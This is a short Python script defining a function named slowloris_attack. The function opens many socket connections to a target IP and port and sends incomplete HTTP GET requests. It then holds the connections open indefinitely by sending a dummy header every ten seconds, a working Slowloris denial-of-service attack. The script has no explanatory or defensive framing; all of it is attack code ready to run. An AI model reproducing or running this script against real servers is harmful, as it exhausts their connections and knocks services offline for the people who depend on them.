import socket
import threading
import time

def slowloris_attack(target_ip, target_port, connection_count):
    sockets = []
    for _ in range(connection_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n")
            sockets.append(s)
        except:
            pass

    while True:
        for s in sockets:
            try:
                s.send(b"X-a: keep-alive\r\n")
            except:
                sockets.remove(s)
        time.sleep(10)
